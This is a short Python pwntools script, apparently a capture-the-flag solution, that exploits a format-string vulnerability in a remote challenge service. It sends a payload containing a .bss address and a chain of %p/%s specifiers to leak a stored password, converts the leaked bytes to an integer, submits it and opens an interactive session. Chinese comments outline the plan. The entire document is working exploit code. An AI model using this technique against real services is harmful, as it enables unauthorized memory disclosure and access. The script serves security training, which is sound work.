from pwn import *

context.terminal=['tmux','splitx','-h']
context.log_level='debug'

# p = process('./fmt')
p=remote('cssc.vul337.team',49321)

# cssc.vul337.team:49318
addr=0x0804C044

# payload=p32(addr)+b'%s'
payload=p32(addr)+b'-%p-%p-%p-%p-%p-%p-%p-%p-%p-%s'

p.sendline(payload)

recv=p.recvline()
print(recv)
passwd=recv[-5:-1]
print(passwd)

int_passwd=int.from_bytes(passwd,'little')
print(int_passwd)

print(str(int_passwd))

p.sendafter(b'your passwd:',bytes(str(int_passwd),encoding='utf-8'))

p.interactive()


# 现在需要：先把bss的地址写到栈里
# 然后再用格式化字符串漏洞来读bss地址里的内容
